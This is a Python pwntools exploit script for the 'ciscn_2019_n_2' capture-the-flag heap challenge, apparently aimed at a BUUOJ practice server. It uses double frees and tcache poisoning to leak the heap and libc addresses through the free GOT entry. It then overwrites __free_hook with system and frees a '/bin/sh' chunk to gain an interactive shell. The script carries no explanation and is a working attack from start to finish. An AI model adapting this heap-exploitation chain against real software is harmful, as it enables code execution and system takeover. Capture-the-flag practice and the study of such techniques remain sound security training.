import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_n_2')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_n_2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',25744)
			elf=ELF('./ciscn_2019_n_2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a,b):
			io.sendlineafter('Your choice: ','1')
			io.sendafter('name:',b)
			io.sendlineafter('age:',str(a))

		def edit(a,b,c):
			io.sendlineafter('Your choice: ','3')
			io.sendlineafter('Index:',str(a))
			io.sendafter('name:',c)
			io.sendlineafter('age:',str(b))

		def show(a):
			io.sendlineafter('Your choice: ','4')
			io.sendlineafter('Index:',str(a))

		def delete(a):
			io.sendlineafter('Your choice: ','2')
			io.sendlineafter('Index:',str(a))

		def add_monny(a):
			io.sendlineafter('Your choice: ','5')
			io.sendlineafter('Index:',str(a))

		def leak(a,b):
			io.sendlineafter('Your choice: ','6')
			io.sendlineafter('Index:',str(0))
			io.sendlineafter('input the address you want to leak:',a)
			io.sendlineafter('input the size you want to leak:',str(b))


		add(18,'aaaa')
		add(0x21,p64(0x21))
		delete(1)
		delete(0)
		delete(0)
		add(0,'1')
		show(0)
		io.recvuntil('\nname: ')
		data=io.recvuntil('\nage',drop=True)
		heap_base=u64(data.ljust(8,'\x00'))-0x231
		delete(0)
		add(0x21,p64(0x602060))
		add(0x21,p64(0x31))
		add(elf.got['free'],p64(elf.got['free']))
		show(1)
		io.recvuntil('\nname: ')
		libc_base=u64(io.recvuntil('\nage',drop=True).ljust(8,'\x00'))-libc.sym['free']
		libc.address=libc_base
		edit(2,libc.sym['__free_hook'],'/bin/sh\x00')
		edit(1,0,p64(libc.sym['system']))
		delete(2)


		success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue